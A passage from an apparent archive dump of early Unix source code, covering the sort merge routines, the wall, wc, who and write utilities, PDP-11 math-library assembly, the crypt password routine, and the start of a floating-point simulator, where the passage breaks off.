struct merg
{
	char	l[L];
	int	b[259];
};

merge(a, b)
{
	register struct merg *p;
	register char *cp;
	register i;
	struct { int *ip;};
	int f;
	int j;
	int	k,l,c;

	p = lspace;
	j = 0;
	for(i=a; i<b; i++) {
		f = setfil(i);
		if(f == 0)
			p->b[0] = dup(0);
		else if(fopen(f, p->b) < 0)
			cant(f);
		ibuf[j] = p;
		if(!rline(p)) j++;
		p++;
	}

	do {
		i = j;
		qsort(ibuf, i, 2, cmp);
		l = 0;
		while(i--) {
			cp = ibuf[i];
			if(*cp == '\0') {
				l = 1;
				if(rline(ibuf[i])) {
					k = i;
					while(++k < j)
						ibuf[k-1] = ibuf[k];
					j--;
				}
			}
		}
	} while(l);

	i = j;
	if(i > 0) for(;;) {
		cp = ibuf[i-1];
		if(i == 1 || cmp(&ibuf[i-1], &ibuf[i-2]))
			do
				putc(*cp, obuf);
			while(*cp++ != '\n');
		if(rline(ibuf[i-1])) {
			i--;
			if(i == 0)
				break;
		}
		cp = &ibuf[i];
		while (--cp.ip > ibuf && cmp(cp.ip, cp.ip-1) < 0) {
			p = *cp.ip;
			*cp.ip = *(cp.ip-1);
			*(cp.ip-1) = p;
		}
	}
	p = lspace;
	for(i=a; i<b; i++) {
		close(p->b[0]);
		p++;
		if(i >= eargc)
			close(creat(setfil(i)));
	}
	fflush(obuf);
	close(obuf[0]);
}

rline(mp)
struct merg *mp;
{
	register char *cp;
	register *bp, c;

	bp = mp->b;
	cp = mp->l;
	do {
		c = getc(bp);
		if(c < 0)
			return(1);
		*cp++ = c;
	} while(c != '\n');
	*cp = '\0';
	return(0);
}

newfile()
{

	if(fcreat(setfil(nfiles), obuf) < 0) {
		mess("Can't create temp\n");
		term();
	}
	nfiles++;
}

char *
setfil(i)
{

	if(i < eargc)
		if(eargv[i][0] == '-' && eargv[i][1] == '\0')
			return(0);
		else
			return(eargv[i]);
	i =- eargc;
	filep[0] = i/26 + 'a';
	filep[1] = i%26 + 'a';
	return(file);
}

oldfile()
{

	if(outfil) {
		if(fcreat(outfil, obuf) < 0) {
			mess("Can't create output\n");
			term();
		}
	} else
		obuf[0] = 1;
}

cant(f)
{
	mess("Can't open ");
	mess(f);
	mess("\n");
	term();
}

term()
{
	register i;

	if(nfiles == eargc)
		nfiles++;
	for(i=eargc; i<nfiles; i++) {
		unlink(setfil(i));
	}
	exit(error);
}

cmp(a, b)
int	*a,*b;
{
	register char	*ra, *rb;

	ra = *a - 1;
	rb = *b - 1;

	while(*++ra == *++rb)
		if(*ra == '\n')
			return(0);

	return(*rb - *ra);
}


skip(pp, fp, j)
struct field *fp;
char *pp;
{
	register i;
	register char *p;

	p = pp;
	if( (i=fp->m[j]) < 0)
		return(-1);
	while(i-- > 0) {
		if(tabchar != 0) {
			while(*p != tabchar)
				if(*p != '\n')
					p++;
				else goto ret;
			p++;
		} else {
			while(blank(*p))
				p++;
			while(!blank(*p))
				if(*p != '\n')
					p++;
				else goto ret;
		}
	}
	if(fp->bflg)
		while(blank(*p))
			p++;
	i = fp->n[j];
	while(i-- > 0) {
		if(*p != '\n')
			p++;
		else goto ret;
	} 
ret:
	return(p);
}

digit(c)
{

	return(c <= '9' && c >= '0');
}

mess(s)
char *s;
{
	while(*s)
		write(2, s++, 1);
}

copyproto()
{
	register int i, *p, *q;

	p = proto;
	q = &fields[nfields];
	for(i=0; i<sizeof(proto)/2; i++)
		*q++ = *p++;
}

field(s,k)
char *s;
{
	register struct field *p;
	p = &fields[nfields];
	for(; *s!=0; s++) {
		switch(*s) {
		case '\0':
			return;

		case 'a':
			p->code = nofold;
			break;

		case 'b':
			p->bflg++;
			break;

		case 'd':
			p->ignore = dict;
			break;

		case 'n':
			p->nflg++;
			break;
		case 't':
			tabchar = *++s;
			if(tabchar == 0) s--;
			break;

		case 'r':
			p->rflg = -1;
			break;

		default:
			p->m[k] = number(&s);
			if(*s == '.')
				s++;
			p->n[k] = number(&s);
			s--;
		}
	}
}

number(ppa)
char **ppa;
{
	int n;
	register char *pa;
	pa = *ppa;
	n = 0;
	while(digit(*pa))
		n = n*10 + *pa++ - '0';
	*ppa = pa;
	return(n);
}

blank(c)
{
	if(c==' ' || c=='\t')
		return(1);
	return(0);
}

int	(*qscmp)();
int	qses;

qsort(a, n, es, fc)
char *a;
int n, es;
int (*fc)();
{
	qscmp = fc;
	qses = es;
	qs1(a, a+n*es);
}

qs1(a, l)
char *a, *l;
{
	register char *i, *j, *es;
	char **k;
	char *lp, *hp;
	int n, c;


	es = qses;

start:
	if((n=l-a) <= es)
		return;


	n = ((n/(2*es))*es) & 077777;
	hp = lp = a+n;
	i = a;
	j = l-es;


	for(;;) {
		if(i < lp) {
			if((c = (*qscmp)(i, lp)) == 0) {
				qsexc(i, lp =- es);
				continue;
			}
			if(c < 0) {
				i =+ es;
				continue;
			}
		}

loop:
		if(j > hp) {
			if((c = (*qscmp)(hp, j)) == 0) {
				qsexc(hp =+ es, j);
				goto loop;
			}
			if(c > 0) {
				if(i == lp) {
					qstexc(i, hp =+ es, j);
					i = lp =+ es;
					goto loop;
				}
				qsexc(i, j);
				j =- es;
				i =+ es;
				continue;
			}
			j =- es;
			goto loop;
		}


		if(i == lp) {
			for(k=lp+2; k<=hp;) *(*k++)='\0';
			if(lp-a >= l-hp) {
				qs1(hp+es, l);
				l = lp;
			} else {
				qs1(a, lp);
				a = hp+es;
			}
			goto start;
		}


		qstexc(j, lp =- es, i);
		j = hp =- es;
	}
}

qsexc(i, j)
char *i, *j;
{
	register char *ri, *rj, c;
	int n;

	n = qses;
	ri = i;
	rj = j;
	do {
		c = *ri;
		*ri++ = *rj;
		*rj++ = c;
	} while(--n);
}

qstexc(i, j, k)
char *i, *j, *k;
{
	register char *ri, *rj, *rk;
	char	c;
	int	n;

	n = qses;
	ri = i;
	rj = j;
	rk = k;
	do {
		c = *ri;
		*ri++ = *rk;
		*rk++ = *rj;
		*rj++ = c;
	} while(--n);
}
-- /usr/source/s2/wall.c mode=0100664 uid=3 gid=3 atime=174923909 mtime=169260601 --
char	mesg[3000];
int	msize;
struct
{
	char	name[8];
	char	tty[2];
	int	time[2];
	int	junk;
} utmp[50];

main(argc, argv)
char *argv[];
{
	register i, *p;
	int f;

	f = open("/etc/utmp", 0);
	if(f < 0) {
		printf("utmp?\n");
		exit();
	}
	read(f, utmp, sizeof utmp);
	close(f);
	f = 0;
	if(argc >= 2) {
		f = open(argv[1], 0);
		if(f < 0) {
			printf("%s?\n", argv[1]);
			exit();
		}
	}
	while((i = read(f, &mesg[msize], sizeof mesg - msize)) > 0)
		msize =+ i;
	close(f);
	for(i=0; i<sizeof utmp/sizeof utmp[0]; i++) {
		p = &utmp[i];
		if(p->tty[0] == 0)
			continue;
		sleep(1);
		sendmes(p->tty[0]);
	}
}

sendmes(tty)
{
	register i;
	register char *s;

	i = fork();
	if(i == -1) {
		printf("try again\n");
		return;
	}
	if(i)
		return;
	s = "/dev/ttyx";
	s[8] = tty;
	i = open(s, 1);
	if(i < 0) {
		printf("cannot open tty%c\n", tty);
		exit();
	}
	close(1);
	dup(i);
	printf("Broadcast Message ...\n\n");
	write(1, mesg, msize);
	exit();
}
-- /usr/source/s2/wc.c mode=0100664 uid=3 gid=3 atime=174923920 mtime=169260601 --
/* wc line and word count */

int	buf[259];
int wordct[2];
int twordct[2];
int linect[2];
int tlinect[2];

main(argc,argv)
char **argv;
{
	int i, token;
	register char *p1, *p2;
	register int c;

	i = 1;
	do {
		if(argc<=1) buf[0] = 0;
		else if(fopen(argv[i],buf)<0) {
			diag(argv[i]);
			diag(": cannot open\n");
			continue;
		}
		p1 = 0;
		p2 = 0;
		linect[0] = linect[1] = 0;
		wordct[0] = wordct[1] = 0;
		token = 0;
		for(;;) {
			if(p1 >= p2) {
				p1 = &buf[1];
				c = read(buf[0], p1, 512);
				if(c <= 0)
					break;
				p2 = p1+c;
			}
			c = 0;
			c =| *p1++;
			if(' '<c&&c<0177) {
				if(!token++) {
					if(++wordct[1]==0)
						wordct[0]++;
				}
			} else {
				if(c=='\n') {
					if(++linect[1]==0)
						linect[0]++;
				}
				else if(c!=' '&&c!='\t')
					continue;
				token = 0;
			}
		}
		printf("%7s ",locv(linect[0],linect[1]));
		printf("%7s ",locv(wordct[0],wordct[1]));
		printf("%s\n", argc<=1?"":argv[i]);
		close(buf[0]);
		ladd(tlinect, tlinect, linect);
		ladd(twordct, twordct, wordct);
	} while(++i<argc);
	if(argc > 2) {
		printf("%7s ",locv(tlinect[0],tlinect[1]));
		printf("%7s ",locv(twordct[0],twordct[1]));
		printf("total\n");
	}
}

diag(s)
char *s;
{
	while(*s)
		write(2,s++,1);
}
-- /usr/source/s2/who.c mode=0100664 uid=3 gid=3 atime=174923931 mtime=169260601 --
/*
 * who
 */

int	fout;
int	buf[256];

main(argc, argv)
char **argv;
{
	char *s, *cbuf;
	int n, fi, i;
	int tty;
	struct {
		char name[8];
		char tty;
		char pad1;
		int time[2];
		char pad2[2];
	} *p;

	s = "/etc/utmp";
	if(argc == 2)
		s = argv[1];
	fi = open(s, 0);
	if(fi < 0) {
		write("cannot open wtmp\n", 17);
		exit();
	}
	fout = dup(1);
	close(1);
	if (argc==3)
		tty = ttyn(0);

loop:
	n = read(fi, buf, 512);
	if(n == 0) {
		flush();
		if (argc==3)
			write(fout, "Nobody.\n", 8);
		exit();
	}

	p = &buf;
	for(p = &buf; (n =- 16)>=0; p++) {
		if (argc==3 && tty!=p->tty)
			continue;
		if(p->name[0] == '\0' && argc==1)
			continue;
		for(i=0; i<8; i++) {
			if(p->name[i] == '\0')
				p->name[i] = ' ';
			putchar(p->name[i]);
		}
		for(i=0; i<3; i++)
			putchar("tty"[i]);
		putchar(p->tty);
		cbuf = ctime(p->time);
		for(i=3; i<16; i++)
			putchar(cbuf[i]);
		putchar('\n');
		if (argc==3) {
			flush();
			exit();
		}
	}
	goto loop;
}
-- /usr/source/s2/write.s mode=0100664 uid=3 gid=3 atime=174923941 mtime=169260601 --
/ write -- write to another user

.globl	ttyn

	cmp	(sp)+,$2
	beq	1f
	bgt	2f
	mov	$1,r0
	sys	write; argm; eargm-argm
	sys	exit
2:
	movb	*4(sp),ltty
1:
	tst	(sp)+
	mov	(sp)+,r5
	sys	open; utmp; 0
	bec	1f
	mov	$1,r0
	sys	write; film; efilm-film
	sys	exit
1:
	mov	r0,ufil
1:
	mov	ufil,r0
	sys	read; ubuf; 16.
	tst	r0
	bne	2f
	jmp	8f
2:
	tstb	ltty
	beq	2f
	cmpb	ltty,8.+ubuf
	bne	1b
2:
	mov	$ubuf,r3
	mov	r5,r4
	mov	$9.,r2
2:
	dec	r2
	beq	2f
	cmpb	(r4)+,(r3)+
	beq	2b
	tstb	-1(r4)
	bne	1b
	cmpb	$' ,-1(r3)
	bne	1b
2:
	movb	8.+ubuf,ttyno
	sys	open; ttyx; 1
	bes	3f
	sys	stat; ttyx; statbuf
	bes	3f
	bit	$2,statbuf+4
	bne	2f
3:
	mov	$1,r0
	sys	write; dnymes; ednymes-dnymes
	sys	exit
2:
	mov	r0,ttyf
	clr	r0
	jsr	pc,ttyn
	mov	r0,r3
	mov	statbuf,r4
	mov	ufil,r0
	sys	seek; 0; 0
1:
	mov	ufil,r0
	sys	read; ubuf; 16.
	tst	r0
	beq	unknown
	cmp	r3,ubuf+8.
	bne	1b
	mov	$ubuf,r0
	mov	$8.,r1
1:
	cmpb	$' ,(r0)+
	beq	1f
	dec	r1
	bne	1b
1:
	neg	r1
	add	$8,r1
	mov	r1,0f
6:
	mov	ttyf,r0
	sys	write; mesg; emesg-mesg
	mov	ttyf,r0
	sys	0; 5f
.data
5:
	sys	write; ubuf; 0:2
.text
	mov	ttyf,r0
	sys	write; qnl; 4
	sys	signal; 2; 9f
7:
	clr	r0
	sys	read; ch; 1
	tst	r0
	beq	9f
	tst	nlflg
	beq	1f
	cmp	ch,$'!
	bne	1f
	sys	fork
		br mshproc
	sys	wait
	mov	$1,r0
	sys	write; excl; 2
	br	7b
1:
	clr	nlflg
	cmp	ch,$'\n
	bne	1f
	inc	nlflg
1:
	mov	ttyf,r0
	sys	write; ch; 1
	br	7b
8:
	movb	(r5)+,ch
	beq	8f
	mov	$1,r0
	sys	write; ch; 1
	br	8b
8:
	tstb	ltty
	beq	8f
	mov	$1,r0
	sys	write; ltty-1; 2
8:
	mov	$1,r0
	sys	write; errmsg; eerrmsg-errmsg
	sys	exit
9:
	mov	ttyf,r0
	sys	write; endmsg; eendmsg-endmsg
	sys	exit

unknown:
	mov	$"??,ubuf
	br	6b

mshproc:
	sys	exec; msh; mshp
	sys	exit

.data
nlflg:
	1
.text

mshp:
	msh
	minust
	0
msh:
	</bin/sh\0>
minust:
	<-t\0>
argm:
	<Arg count\n>
eargm:
film:
	<Cannot open utmp\n>
efilm:
.data
	< >		/ is ltty -1
ltty:
	.=.+1
.text
excl:
	<!\n>
qnl:
	<...\n>
.data
ttyx:
	</dev/ttyx\0>
ttyno	= .-2
.text
utmp:
	</etc/utmp\0>
endmsg:
	<EOT\n>
eendmsg:
errmsg:
	< not logged in.\n>
eerrmsg:
mesg:
	<\nMessage from >
emesg:
dnymes:
	<Permission denied.\n>
ednymes:
	.even
	.bss

ttyf:	.=.+2
ubuf:	.=.+16.
statbuf:.=.+40.
ch:	.=.+2
ufil:	.=.+2
signal = 48.
-- /usr/source/s3 mode=0140775 uid=3 gid=3 atime=174930092 mtime=174923999 --
-- /usr/source/s3/atan.s mode=0100664 uid=3 gid=3 atime=174923949 mtime=169260611 --
ldfps = 170100^tst
stfps = 170200^tst
/
.globl	atan, _atan
.globl	atan2, _atan2
/
/	floating-point arctangent
/
/	atan replaces the value in fr0 by its arctangent
/	in the range [-pi/2,pi/2].
/
/	atan2 places in fr0 the arctangent of fr0/fr1
/	in the range [-pi,pi].
/
/	there are no error exits
/
/	coefficients are #5076 from Hart & Cheney.
/
/

_atan:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	jsr	pc,atan
	br	1f

_atan2:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	movf	12.(r5),fr1
	jsr	pc,atan2
1:
	mov	(sp)+,r5
	rts	pc
atan:
	jsr	r0,save
	tstf	fr0
	cfcc
	blt	1f
	jsr	pc,satan
	br	ret
1:
	negf	fr0
	jsr	pc,satan
	negf	fr0
	br	ret
/
atan2:
	jsr	r0,save
	clr	-(sp)
	tstf	fr0
	cfcc
	bge	1f
	inc	(sp)
	negf	fr0
1:
	tstf	fr1
	cfcc
	beq	2f
	bgt	1f
	add	$2,(sp)
	negf	fr1
1:
	divf	fr1,fr0
	jsr	pc,satan
	br	1f
2:
	movf	pi2,fr0
1:
	bit	$2,(sp)
	beq	1f
	negf	fr0
	addf	pi2,fr0
	addf	pi2,fr0
1:
	bit	$1,(sp)+
	beq	1f
	negf	fr0
1:

ret:
	ldfps	(sp)+
	movf	(sp)+,fr3
	movf	(sp)+,fr2
	movf	(sp)+,fr1
	mov	(sp)+,r0
	rts	pc

save:
	movf	fr1,-(sp)
	movf	fr2,-(sp)
	movf	fr3,-(sp)
	stfps	-(sp)
	ldfps	$40200		/ DP, no interrupt
	jmp	(r0)

satan:
	cmpf	sq2m1,fr0
	cfcc
	bge	arctan
	cmpf	sq2p1,fr0
	cfcc
	bgt	1f
	movf	one,fr1
	divf	fr0,fr1
	movf	fr1,fr0
	jsr	pc,arctan
	negf	fr0
	addf	pi2,fr0
	rts	pc
1:
	movf	fr0,fr1
	subf	one,fr0
	addf	one,fr1
	divf	fr1,fr0
	jsr	pc,arctan
	addf	pi4,fr0
	rts	pc
arctan:
	mov	$p4p,r0
	mov	$4,-(sp)
	movf	fr0,fr3
	mulf	fr3,fr3
	movf	*(r0)+,fr1
1:
	mulf	fr3,fr1
	addf	*(r0)+,fr1
	dec	(sp)
	bne	1b
	mov	$4,(sp)
	movf	fr3,fr2
	br	2f
1:
	mulf	fr3,fr2
2:
	addf	*(r0)+,fr2
	dec	(sp)
	bne	1b
	tst	(sp)+
	divf	fr2,fr1
	mulf	fr1,fr0
	rts	pc

.data

p4p:
	p4;p3;p2;p1;p0
	q3;q2;q1;p0

one:	40200;0;0;0
pi2:	40311;7732;121041;64302
pi4:	40111;7732;121041;64302

sq2p1:	40432
	101171
	114774
	167461

sq2m1:	37724
	11714
	147747
	74621

p4:	37442
	145026
	75504
	15621
p3:	40725
	21566
	115517
	50305
p2:	41443
	160206
	172714
	25441
p1:	41632
	172223
	76027
	56645
p0:	41462
	25125
	6152
	126064
q3:	41170
	10112
	141724
	64324
q2:	41573
	53776
	25372
	71522
q1:	41670
	123114
	51576
	75020

/	one = 1.00000 00000 00000 00000 d0
/	sq2p1=2.41421 35623 73095 04880 d0
/	sq2m1= .41421 35623 73095 04880 d0
/	pi2 = 1.57079 63267 94896 61923  d0
/	p4 = .15897 40288 48230 7048 d0
/	p3 = .66605 79017 00926 2658 d1
/	p2 = .40969 26483 21022 5637 d2
/	p1 = .77477 68771 92042 0862 d2
/	p0 = .44541 34005 92906 8032 d2
/	q4 = .10000 00000 00000 0000 d1
/	q3 = .15503 97755 14219 8753 d2
/	q2 = .62835 93051 10323 7683 d2
/	q1 = .92324 80107 23009 7484 d2
/	q0 = .44541 34005 92906 8044 d2
-- /usr/source/s3/crypt.s mode=0100664 uid=3 gid=3 atime=174923951 mtime=169260611 --
/ crypt -- password incoding

/	mov	$key,r0
/	jsr	pc,crypt

.globl	crypt, _crypt
.globl	savr5

_crypt:
	mov	r5,-(sp)
	mov	sp,r5
	mov	r5,savr5
	mov	4(r5),r0
	jsr	pc,crypt
	clr	savr5
	mov	(sp)+,r5
	rts	pc

crypt:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r4,-(sp)
	mov	r5,-(sp)

	mov	r0,r1
	mov	$key,r0
	movb	$004,(r0)+
	movb	$034,(r0)+
1:
	cmp	r0,$key+64.
	bhis	1f
	movb	(r1)+,(r0)+
	bne	1b
1:
	dec	r0
/
/
/	fill out key space with clever junk
/
	mov	$key,r1
1:
	movb	-1(r0),r2
	movb	(r1)+,r3
	xor	r3,r2
	movb	r2,(r0)+
	cmp	r0,$key+128.
	blo	1b
/
/
/	establish wheel codes and cage codes
/
	mov	$wheelcode,r4
	mov	$cagecode,r5
	mov	$256.,-(sp)
2:
	clr	r2
	clr	(r4)
	mov	$wheeldiv,r3
3:
	clr	r0
	mov	(sp),r1
	div	(r3)+,r0
	add	r1,r2
	bic	$40,r2
	bis	shift(r2),(r4)
	cmp	r3,$wheeldiv+6.
	bhis	4f
	bis	shift+4(r2),(r5)
4:
	cmp	r3,$wheeldiv+10.
	blo	3b
	sub	$2,(sp)
	tst	(r4)+
	tst	(r5)+
	cmp	r4,$wheelcode+256.
	blo	2b
	tst	(sp)+
/
.data
shift:	1;2;4;10;20;40;100;200;400;1000;2000;4000;10000;20000;40000;100000
	1;2
wheeldiv: 32.; 18.; 10.; 6.; 4.
.bss
cagecode: .=.+256.
wheelcode: .=.+256.
.text
/
/
/	make the internal settings of the machine
/	both the lugs on the 128 cage bars and the lugs
/	on the 16 wheels are set from the expanded key
/
	mov	$key,r0
	mov	$cage,r2
	mov	$wheel,r3
1:
	movb	(r0)+,r1
	bic	$!177,r1
	asl	r1
	mov	cagecode(r1),(r2)+
	mov	wheelcode(r1),(r3)+
	cmp	r0,$key+128.
	blo	1b
/
/
/	now spin the cage against the wheel to produce output.
/
	mov	$word,r4
	mov	$wheel+128.,r3
3:
	mov	-(r3),r2
	mov	$cage,r0
	clr	r5
1:
	bit	r2,(r0)+
	beq	2f
	incb	r5
2:
	cmp	r0,$cage+256.
	blo	1b
/
/	we have a piece of output from current wheel
/	it needs to be folded to remove lingering hopes of
/	inverting the function
/
	mov	r4,-(sp)
	clr	r4
	div	$26.+26.+10.,r4
	add	$'0,r5
	cmp	r5,$'9
	blos	1f
	add	$'A-'9-1,r5
	cmp	r5,$'Z
	blos	1f
	add	$'a-'Z-1,r5
1:
	mov	(sp)+,r4
	movb	r5,(r4)+
	cmp	r4,$word+8.
	blo	3b
/

	mov	(sp)+,r5
	mov	(sp)+,r4
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	mov	$word,r0
	rts	pc
.bss
key:	.=.+128.
word:	.=.+32.
cage:	.=.+256.
wheel:	.=.+256.
-- /usr/source/s3/dpadd.s mode=0100664 uid=3 gid=3 atime=174923953 mtime=169260612 --
/ C library -- signed dp add

/ dpadd(l, i)
/	int l[2];
/ l =+ i;

.globl	_dpadd

_dpadd:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),r0
	tst	6(r5)
	sxt	r1
	add	r1,(r0)+
	add	6(r5),(r0)
	adc	-(r0)
	mov	(sp)+,r5
	rts	pc
-- /usr/source/s3/ecvt.s mode=0100664 uid=3 gid=3 atime=174923955 mtime=169260612 --
ldfps = 170100^tst
stfps = 170200^tst
/ ftoa -- basic g fp conversion

.globl	_ndigit
.globl ecvt
.globl fcvt


/ ecvt converts fr0 into decimal
/ the string of converted digits is pointed to by r0.
/ the number of digits are specified by _ndigit
/ r2 contains the decimal point
/ r1 contains the sign

.globl	_ecvt, _fcvt

_ecvt:
	mov	r5,-(sp)
	mov	sp,r5
	mov	r2,-(sp)
	movf	4(r5),fr0
	mov	14(r5),_ndigit
	jsr	pc,ecvt
	br	1f

_fcvt:
	mov	r5,-(sp)
	mov	sp,r5
	mov	r2,-(sp)
	movf	4(r5),fr0
	mov	14(r5),_ndigit
	jsr	pc,fcvt
1:
	mov	r2,*16(r5)
	mov	r1,*20(r5)
	mov	(sp)+,r2
	mov	(sp)+,r5
	rts	pc

fcvt:
	clr	eflag
	br	1f
ecvt:
	mov	$1,eflag
1:
	stfps	-(sp)
	ldfps	$200
	movf	fr0,-(sp)
	movf	fr1,-(sp)
	mov	r3,-(sp)
	mov	$buf,r1
	clr	r2
	clr	sign
	tstf	fr0
	cfcc
	beq	zer
	bgt	1f
	inc	sign
	negf	fr0
1:
	modf	$one,fr0
	tstf	fr1
	cfcc
	beq	lss

gtr:
	movf	fr0,-(sp)
	movf	fr1,fr0
1:
	mov	$buftop,r3
1:
	modf	tenth,fr0
	movf	fr0,fr2
	movf	fr1,fr0
	addf	$epsilon,fr2
	modf	$ten,fr2
	movfi	fr3,r0
	add	$'0,r0
	movb	r0,-(r3)
	inc	r2
	tstf	fr0
	cfcc
	bne	1b
/
	mov	$buf,r1
1:
	movb	(r3)+,(r1)+
	cmp	r3,$buftop
	blo	1b
/
	movf	(sp)+,fr0
	br	pad

zer:
	inc	r2
	br	pad

lss:
	dec	r2
	modf	$ten,fr0
	tstf	fr1
	cfcc
	beq	lss
	inc	r2
	jsr	pc,digit1

pad:
	jsr	pc,digit
		br out
	br	pad

digit:
	cmp	r1,$buftop
	bhis	1f
	add	$2,(sp)
	modf	$ten,fr0

digit1:
	movfi	fr1,r0
	add	$'0,r0
	movb	r0,(r1)+
1:
	rts	pc
/
out:
	mov	$buf,r0
	add	_ndigit,r0
	tst	eflag
	bne	1f
	add	r2,r0
1:
	cmp	r0,$buf
	blo	outout
	movb	(r0),r3
	add	$5,r3
	movb	r3,(r0)
1:
	cmpb	(r0),$'9
	ble	1f
	movb	$'0,(r0)
	cmp	r0,$buf
	blos	2f
	incb	-(r0)
	br	1b
2:
	movb	$'1,(r0)
	inc	r2
1:
outout:
	mov	sign,r1
	mov	_ndigit,r0
	tst	eflag
	bne	1f
	add	r2,r0
1:
	clrb	buf(r0)
	mov	$buf,r0
	mov	(sp)+,r3
	movf	(sp)+,fr1
	movf	(sp)+,fr0
	ldfps	(sp)+
	rts	pc

epsilon = 037114
one	= 40200
ten	= 41040
	.data
tenth:	037314; 146314; 146314; 146315
_ndigit:10.
	.bss
buf:	.=.+40.
buftop:
sign:	.=.+2
eflag:	.=.+2
	.text
-- /usr/source/s3/exp.s mode=0100664 uid=3 gid=3 atime=174923958 mtime=169260612 --
.globl exp, _exp
/
ldfps = 170100^tst
stfps = 170200^tst
ldexp = 176400^movif
stexp = 175000^movfi
/
/	exp accepts its argument and returns its result
/	in fr0.  The carry bit is set if the result overflows.
/	The coefficients are #1067 from Hart & Cheney.
/
/	movf	arg,fr0
/	jsr	pc,exp
/	movf	fr0,result
/
_exp:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),fr0
	jsr	pc,exp
	mov	(sp)+,r5
	rts	pc

exp:
	stfps	-(sp)
	ldfps	$200		/di mode
	movf	fr2,-(sp)
	movf	fr1,-(sp)
	tstf	fr0
	cfcc
	bne	1f
	movf	$one,fr0	/exp(0)
	clc
	br	out
1:
	modf	log2e,fr0	/exp(x) = 2^(x*log2(e))
	cfcc
	bmi	2f
	movfi	fr1,-(sp)	/save integer part
	subf	$half,fr0
	br	3f
2:
	movfi	fr1,-(sp)
	dec	(sp)
	addf	$half,fr0
3:
	movf	fr0,fr1		/ -.5 < x < +.5
	mulf	fr1,fr1		/arg**2
/
	movf	P2,fr2
	mulf	fr1,fr2
	addf	P1,fr2
	mulf	fr1,fr2
	addf	P0,fr2
	mulf	fr2,fr0		/xP(x**2)
/
	movf	fr1,fr2
	addf	Q1,fr2
	mulf	fr1,fr2
	addf	Q0,fr2		/Q(x**2)
/
	movf	fr2,fr1
	subf	fr0,fr1
	addf	fr2,fr0
	divf	fr1,fr0		/(Q+xP)/(Q-xP)
	mulf	sqrt2,fr0
/
	stexp	fr0,-(sp)
	add	(sp)+,(sp)
/
	cmp	(sp),$177
	ble	2f
	tst	(sp)+
	movf	big,fr0		/overflow
	sec
	br	1f
2:
	cmp	(sp),$-177
	bge	2f
	tst	(sp)+
	clrf	fr0		/underflow
	clc
	br	1f
2:
	ldexp	(sp)+,fr0
	clc
1:
out:
	movf	(sp)+,fr1
	movf	(sp)+,fr2
	ldfps	(sp)+
	rts	pc
/
/
	.data
P0:	 42675;  36404;  77563;  46675
P1:	 41241; 116724; 114237;  60333
P2:	 36675;  27102; 125560; 136652
Q0:	 43210; 100661;  76072;  62453
Q1:	 42151;  27450;  75350; 112503
log2e:	 40270; 125073;  24534;  13761
sqrt2:	 40265;  02363;  31771; 157144
half	= 40000
one	= 40200
/
big:	 77777; 177777; 177777; 177777
/
/ P0 = .15139 06799 05433 89158 94328 d4
/ P1 = .20202 06565 12869 27227 886   d2
/ P2 = .23093 34775 37502 33624       d-1
/
/ Q0 = .43682 11662 72755 84984 96814 d4
/ Q1 = .23318 42114 27481 62379 0295  d3
/ Q2 = .1                             d1
/
/ log2e = 1.44269 50408 88963 40735 99246
/ sqrt2 = 1.41421 35623 73095 04880 16887
-- /usr/source/s3/fakfp.s mode=0100664 uid=3 gid=3 atime=174845415 mtime=169260612 --
/ fakefp -- fake floating point simulator

.globl	fptrap

fptrap:
	sub	$2,(sp)
	mov	r0,-(sp)
	sys	signal; 4; 0
	mov	(sp)+,r0
	2	/ rti
-- /usr/source/s3/floor.s mode=0100664 uid=3 gid=3 atime=174923960 mtime=169260612 --
.globl	_floor, _ceil
.globl	floor, ceil
one = 40200

_floor:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	jsr	pc,floor
	br	1f

_ceil:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	jsr	pc,ceil
1:
	mov	(sp)+,r5
	rts	pc

floor:
	tstf	fr0
	cfcc
	bge	1f
	modf	$one,fr0
	cfcc
	beq	2f
	subf	$one,fr1
	br	2f
1:
	modf	$one,fr0
2:
	movf	fr1,fr0
	rts	pc

ceil:
	negf	fr0
	jsr	pc,floor
	negf	fr0
	rts	pc
-- /usr/source/s3/fmod.s mode=0100664 uid=3 gid=3 atime=174923962 mtime=169260612 --
/ C floating mod
/ fmod(a,b) returns a number n such that
/	i*b + n is a and 0 <= n < b

.globl	_fmod
_fmod:
	mov	r5,-(sp)
	mov	sp,r5
	movf	4(r5),fr0
	divf	12.(r5),fr0
	modf	$one,fr0
	mulf	12.(r5),fr1
	movf	4(r5),fr0
	subf	fr1,fr0
	mov	(sp)+,r5
	rts	pc
one = 40200
-- /usr/source/s3/fp1.s mode=0110664 uid=3 gid=3 atime=174923965 mtime=169260612 --
/ fp1 -- floating point simulator

rti	= 2
bpt	= 3

m.ext = 200		/ long mode bit
m.lngi = 100		/ long integer mode

.globl	fptrap
.globl	ac0, ac1, ac2, ac3

fptrap:
	dec	reenter
	bge	1f
	4		/ reentered!
1:
	mov	(sp)+,spc
	mov	(sp)+,sps
	mov	r0,sr0
	mov	$sr1,r0
	mov	r1,(r0)+
	mov	r2,(r0)+
	mov	r3,(r0)+
	mov	r4,(r0)+
	mov	r5,(r0)+
	mov	sp,(r0)+
	sub	$8,sp		/ room for double push
	mov	(r0),r5		/ pc
	clr	trapins
	mov	-(r5),r5	/ trapped instruction
	mov	r5,r4
	bic	$7777,r4
	cmp	r4,$170000
	beq	1f
	jmp	badins
1:
	bic	$100000,fpsr	/ clear fp error
	bic	$170000,r5
	mov	r5,r4
	bit	$7000,r4
	bne	class3
	bit	$700,r4
	bne	class2
	cmp	r4,$12
	blos	1f
	jmp	badins
1:
	asl	r4
	jmp	*1f(r4)

	.data
1:
	i.cfcc		/ 170000
	i.setf		/ 170001
	i.seti		/ 170002
	badins
	badins
	badins
	badins
	badins
	badins
	i.setd		/ 170011
	i.setl		/ 170012
	.text

class2:
	cmp	r5,$400
	bge	1f
	jsr	r1,fsrc; mod0rx; mod242
	br	2f
1:
	jsr	r1,fsrc; mod0f; mod24f
2:
	mov	r3,r5
	asl	r4
	asl	r4
	clrb	r4
	swab	r4
	asl	r4
	jsr	pc,*1f(r4)
	jmp	sret

	.data
1:
	badins		/ 1700xx
	i.ldfps		/ 1701xx
	i.stfps		/ 1702xx
